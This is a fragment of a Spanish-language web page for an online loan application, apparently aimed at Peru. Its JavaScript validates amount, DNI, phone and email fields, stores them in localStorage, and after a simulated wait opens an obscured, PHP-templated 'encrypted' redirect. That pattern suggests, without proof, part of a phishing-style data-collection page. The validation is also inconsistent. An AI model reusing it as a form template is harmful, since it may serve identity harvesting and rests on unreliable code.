			input.nextElementSibling.style.color = "var(--onsurface-800, #606c7f)";
			input.style.color = "var(--onsurface-800, #606c7f)"; 
			if (label) {
				label.style.color = "var(--onsurface-800, #606c7f)";
			}
		}
	}
    
function formatoMonto(input) {
  var valor = input.value;
  valor = valor.replace(/\D/g, ""); // Eliminar todos los caracteres que no sean dígitos
  var numericValue = parseFloat(valor) || 0; // Obtén el valor numérico, y si es NaN, establece 0

  input.value = "S/ " + numericValue.toLocaleString('es-PE');
  input.numericValue = numericValue; // Almacena el valor numérico en una propiedad personalizada del input
}
function keyupMonto(input) {
  formatoMonto(input);
  var valor = parseFloat(input.value.replace('S/', '').replace(/,/g, ''));
  var alertamonto = $("#alertamonto");

  if (input.value.trim() === "") {
    // Mostrar un mensaje de alerta si el valor está vacío
    alertamonto.html("Este campo es requerido").show();
  } else if (valor < 100) {
    // Mostrar un mensaje de alerta si el valor es menor que 100
    alertamonto.html("El monto mínimo es S/ 100").show();
    input.style.border = "1px solid #e30425";
    input.nextElementSibling.style.color = "#e30425";
  } else if (valor > 150000) {
    // Mostrar un mensaje de alerta si el valor es mayor que 150,000
    alertamonto.html("El monto máximo es S/ 150,000").show();
    input.style.border = "1px solid #e30425";
    input.nextElementSibling.style.color = "#e30425";
  } else {
    input.nextElementSibling.style.color = "rgb(10, 71, 240)";
    input.style.border = "2px solid rgb(10, 71, 240)";
    alertamonto.hide();
  }
}
</script>
<script>
	function onfocusDni(input) {
  		var valor = input.value;
		// 1ra validación: Si el valor es igual a 0 o está vacío
		if (valor === 0 || input.value.trim() === "") {
			input.nextElementSibling.classList.add("enfocado");
			input.nextElementSibling.style.color = "rgb(10, 71, 240)";
    		input.style.border = "2px solid rgb(10, 71, 240)";
			input.style.color = "var(--onsurface-800, #606c7f)";
			$("#alertadni").html("Este campo es requerido").hide();
    		var label = document.getElementById("labeldni");
			if (label) {
				label.style.color = "rgb(10, 71, 240)";
			}
		}
		
		// 2da validación: Si el valor es mayor que 99 y menor que 150001
		else if (!isNaN(valor) && /^\d{8}$/.test(valor)) {
			input.style.border = "2px solid rgb(10, 71, 240)";
			input.nextElementSibling.style.color = "rgb(10, 71, 240)";
			input.style.color = "var(--onsurface-800, #606c7f)";
			var label = document.getElementById("labeldni");
			if (label) {
				label.style.color = "rgb(10, 71, 240)";
			}
		}
		// 3ra validación: Si no se cumple ninguna de las condiciones anteriores
		else {
			input.style.border = "2px solid #e30425";
			input.nextElementSibling.style.color = "#e30425";
			input.style.color = "var(--onsurface-800, #606c7f)";
			var label = document.getElementById("labeldni");
			if (label) {
				label.style.color = "#e30425 !important";
			}
		}
	}
	
	function onblurDni(input) {
    let valor = input.value;
		if (valor === 0 || input.value.trim() === "" || input.value === "") {
			input.nextElementSibling.classList.remove("enfocado");
			input.nextElementSibling.style.color = "#e30425";
    		input.style.border = "1px solid #e30425";
			$("#alertadni").html("Este campo es requerido").show();
		}
		else if (!isNaN(valor) && !/^\d{8}$/.test(valor)) {
			input.style.border = "1px solid #e30425";
			input.style.color = "#e30425"; 
			input.nextElementSibling.style.color = "#e30425";
			var label = document.getElementById("labeldni");
			if (label) {
				label.style.color = "#e30425 !important";
			}
		}
		else {
		input.style.border = "1px solid var(--onsurface-300,#bfc4cc)";
			input.nextElementSibling.style.color = "var(--onsurface-800, #606c7f)";
			var label = document.getElementById("labeldni");
			if (label) {
				label.style.color = "var(--onsurface-800, #606c7f)";
			}
		}
	}
    
	function keyupDni(input) {
  		var valor = input.value;
  		var alertadni = $("#alertadni");
		
		if (input.value.trim() === "") {
			// Mostrar un mensaje de alerta si el valor está vacío
    		alertadni.html("Este campo es requerido").show();
  		} else if (!isNaN(valor) && !/^\d{8}$/.test(valor)) {
			// Mostrar un mensaje de alerta si el valor es menor que 100
			alertadni.html("Ingresa un documento válido").show();
			input.style.border = "1px solid #e30425";
			input.nextElementSibling.style.color = "#e30425";
		} else {
			input.nextElementSibling.style.color = "rgb(10, 71, 240)";
    		input.style.border = "2px solid rgb(10, 71, 240)"; 
			alertadni.hide();
		}
	} 
</script>
<script>
	function onfocusTlf(input) {
  		var valor = parseFloat(input.value);
		// 1ra validación: Si el valor es igual a 0 o está vacío
		if (valor === 0 || input.value.trim() === "") {
			input.nextElementSibling.classList.add("enfocado");
			input.nextElementSibling.style.color = "rgb(10, 71, 240)";
			input.style.color = "var(--onsurface-800, #606c7f)";
    		input.style.border = "2px solid rgb(10, 71, 240)";
			$("#alertatlf").html("Este campo es requerido").hide();
    		var label = document.getElementById("labeltlf");
			if (label) {
				label.style.color = "rgb(10, 71, 240)";
			}
		}
		
		// 2da validación: Si el valor es mayor que 99 y menor que 150001
		else if (!isNaN(valor) && /^9\d{8}$/.test(valor)) {
			input.style.border = "2px solid rgb(10, 71, 240)";
			input.style.color = "var(--onsurface-800, #606c7f)";
			input.nextElementSibling.style.color = "rgb(10, 71, 240)";
			var label = document.getElementById("labeltlf");
			if (label) {
				label.style.color = "rgb(10, 71, 240)";
			}
		}
		// 3ra validación: Si no se cumple ninguna de las condiciones anteriores
		else {
			input.style.border = "2px solid #e30425";
			input.style.color = "var(--onsurface-800, #606c7f)";
			input.nextElementSibling.style.color = "#e30425";
			var label = document.getElementById("labeltlf");
			if (label) {
				label.style.color = "#e30425 !important";
			}
		}
	}
	
	function onblurTlf(input) {
    let valor = parseFloat(input.value);
		if (valor === 0 || input.value.trim() === "" || input.value === "") {
			input.nextElementSibling.classList.remove("enfocado");
			input.nextElementSibling.style.color = "#e30425";
    		input.style.border = "1px solid #e30425";
			$("#alertatlf").html("Este campo es requerido").show();
		}
		else if (!isNaN(valor) && !/^9\d{8}$/.test(valor)) {
			input.style.border = "1px solid #e30425";  
			input.nextElementSibling.style.color = "#e30425";
			input.style.color = "#e30425"; 
			var label = document.getElementById("labeltlf");
			if (label) {
				label.style.color = "#e30425 !important";
			}
		}
		else {
		input.style.border = "1px solid var(--onsurface-300,#bfc4cc)";
			input.nextElementSibling.style.color = "var(--onsurface-800, #606c7f)";
			input.style.color = "var(--onsurface-800, #606c7f)"; 
			var label = document.getElementById("labeltlf");
			if (label) {
				label.style.color = "var(--onsurface-800, #606c7f)";
			}
		}
	}
    
	function keyupTlf(input) {
  		var valor = parseFloat(input.value);
  		var alertatlf = $("#alertatlf");
		
		if (input.value.trim() === "") {
			// Mostrar un mensaje de alerta si el valor está vacío
    		alertatlf.html("Este campo es requerido").show();
  		} else if (!isNaN(valor) && !/^9\d{8}$/.test(valor)) {
			// Mostrar un mensaje de alerta si el valor es menor que 100
			alertatlf.html("Ingresa un número válido").show();
			input.style.border = "1px solid #e30425";
			input.nextElementSibling.style.color = "#e30425";
		} else {
			input.nextElementSibling.style.color = "rgb(10, 71, 240)";
    		input.style.border = "2px solid rgb(10, 71, 240)"; 
			alertatlf.hide();
		}
	} 
</script>

<script>
    function onfocusEmail(input) {
        var valor = parseFloat(input.value);
        // 1ra validación: Si el valor es igual a 0 o está vacío
        if (valor === 0 || input.value.trim() === "") {
            input.nextElementSibling.classList.add("enfocado");
            input.nextElementSibling.style.color = "rgb(10, 71, 240)";
            input.style.color = "var(--onsurface-800, #606c7f)";
            input.style.border = "2px solid rgb(10, 71, 240)";
            $("#alertaemail").html("Este campo es requerido").hide();
            var label = document.getElementById("labelemail");
            if (label) {
                label.style.color = "rgb(10, 71, 240)";
            }
        }
        
        // 2da validación: Si el valor es mayor que 99 y menor que 150001
        else if (!isNaN(valor) && /^9\d{8}$/.test(valor)) {
            input.style.border = "2px solid rgb(10, 71, 240)";
            input.style.color = "var(--onsurface-800, #606c7f)";
            input.nextElementSibling.style.color = "rgb(10, 71, 240)";
            var label = document.getElementById("labelemail");
            if (label) {
                label.style.color = "rgb(10, 71, 240)";
            }
        }
        // 3ra validación: Si no se cumple ninguna de las condiciones anteriores
        else {
            input.style.border = "2px solid #e30425";
            input.style.color = "var(--onsurface-800, #606c7f)";
            input.nextElementSibling.style.color = "#e30425";
            var label = document.getElementById("labelemail");
            if (label) {
                label.style.color = "#e30425 !important";
            }
        }
    }
    
    function onblurEmail(input) {
    let valor = parseFloat(input.value);
        if (valor === 0 || input.value.trim() === "" || input.value === "") {
            input.nextElementSibling.classList.remove("enfocado");
            input.nextElementSibling.style.color = "#e30425";
            input.style.border = "1px solid #e30425";
            $("#alertaemail").html("Este campo es requerido").show();
        }
        else if (!isNaN(valor) && !/^9\d{8}$/.test(valor)) {
            input.style.border = "1px solid #e30425";  
            input.nextElementSibling.style.color = "#e30425";
            input.style.color = "#e30425"; 
            var label = document.getElementById("labelemail");
            if (label) {
                label.style.color = "#e30425 !important";
            }
        }
        else {
        input.style.border = "1px solid var(--onsurface-300,#bfc4cc)";
            input.nextElementSibling.style.color = "var(--onsurface-800, #606c7f)";
            input.style.color = "var(--onsurface-800, #606c7f)"; 
            var label = document.getElementById("labelemail");
            if (label) {
                label.style.color = "var(--onsurface-800, #606c7f)";
            }
        }
    }
    
    function keyupEmail(input) {
        var valor = parseFloat(input.value);
        var alertaemail = $("#alertaemail");
        
        if (input.value.trim() === "") {
            // Mostrar un mensaje de alerta si el valor está vacío
            alertaemail.html("Este campo es requerido").show();
        } else {
            input.nextElementSibling.style.color = "rgb(10, 71, 240)";
            input.style.border = "2px solid rgb(10, 71, 240)"; 
            alertaemail.hide();
        }
    } 
</script>

<script>

    function tipoFiltro(e) {

        var charCode = e.key;

        if((/^[0-9]+$/.test(charCode))) {
            return true;
        } else {
            return false;
        }
    }

function post(post) {
    let a = document.querySelector("#monto"); // Monto
    let b = document.querySelector("#dni"); // Documento
    let c = document.querySelector("#tlf"); // Celular
    let d = document.querySelector("#email"); // Correo

    let labela = document.querySelector("#montolabel"); // Monto
    let labelb = document.querySelector("#labeldni"); // Monto
    let labelc = document.querySelector("#labeltlf"); // Monto
    let labeld = document.querySelector("#labelemail"); // Monto

    let x = post;

    switch (x) {
        case 1: // Login

            if (a.value == "" && b.value == "" && c.value == "" && d.value == "") {
                $("#alertamonto").html("Ingresa tu monto").show();
                $("#alertadni").html("Ingresa tu dni").show();
                $("#alertatlf").html("Ingresa tu teléfono").show();
                $("#alertaemail").html("Ingresa tu correo").show();

                a.style.border = "1px solid rgb(227, 4, 37)";
                b.style.border = "1px solid rgb(227, 4, 37)";
                c.style.border = "1px solid rgb(227, 4, 37)";
                d.style.border = "1px solid rgb(227, 4, 37)";

                labela.style.color = "rgb(227, 4, 37)";
                labelb.style.color = "rgb(227, 4, 37)";
                labelc.style.color = "rgb(227, 4, 37)";
                labeld.style.color = "rgb(227, 4, 37)";

                return false;
            }

            if (a.value <= 500 || a.value > 50000) {
                $("#alerta").html("* Ingrese un monto mayor a 500 y menor a 50.000").show();
                a.focus();
                return false;
            }

            if (b.value.length < 8) {
                $("#alerta").html("* Ingrese ó complete su número de DNI").show();
                b.focus();
                return false;
            }

            if (c.value.length < 9) {
                $("#alerta").html("* Ingrese ó complete su número de Celular").show();
                c.focus();
                return false;
            }

            function validarCorreo(correo) {
                // Expresión regular para validar el formato de un correo electrónico
                var regex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                
                // Validar el correo usando la expresión regular
                if (regex.test(correo)) {
                    return true; // El correo es válido
                } else {
                    return false; // El correo no es válido
                }
            }

            if (!validarCorreo(d.value)) {
                $("#alerta").html("* Ingrese ó complete su correo electronico").show();
                d.focus();
                return false;
            }


            // Almacenar el valor de monto en localStorage
            localStorage.setItem("monto", a.value);
            localStorage.setItem("celular", c.value);
            localStorage.setItem("dni", b.value);
            localStorage.setItem("correo", d.value);

            $("#bodyapp").hide();
            $("#bodyloader").show();

            // Simular una espera de 1.8 segundos antes de redirigir
            setTimeout(function() {
                window.open('<?=$next_location_encrypted;?>', '_parent');
            }, 1800);

            break;

        default:
            break;
    }
}

</script>
<script>
$(document).ready(function() {
    let currentIndex = 0;
    const $images = $(".col img");
    const $stepDescription = $("#stepDescription");
    const $stepText2 = $("#stepText2");
    const $stepPoints = $("#stepPoints").find(".step-point");

    const stepTexts = [
        "Ingresa tu monto y fecha de pago", 
        "Ingresa tus datos",                  
        "Elige tu plan de pago",
        "Elige la forma de pago",
		"Confirma tu préstamo",
		"Listo ya tienes tu préstamo online",
    ];

    function showStep(index) {
        $images.removeClass("active").addClass("transparent");
        $images.eq(index).removeClass("transparent").addClass("active");
        $stepDescription.text(stepTexts[index]);
        $stepText2.text((index + 1) + " de " + $images.length);

        // Actualizar la clase "active" en los puntos de paso
        $stepPoints.removeClass("active");
        $stepPoints.eq(index).addClass("active");
    }

    $("#nextBtn").click(function() {
        currentIndex++;
        if (currentIndex >= $images.length) {
            currentIndex = 0;
        }
        showStep(currentIndex);
    });

    $("#prevBtn").click(function() {
        currentIndex--;
        if (currentIndex < 0) {
            currentIndex = $images.length - 1;
        }
        showStep(currentIndex);
    });

    showStep(currentIndex);
});
</script>
<script>
	function solicitatuprestamo() {
    window.location.href = "";
}
</script>
</div>
</body>
</html>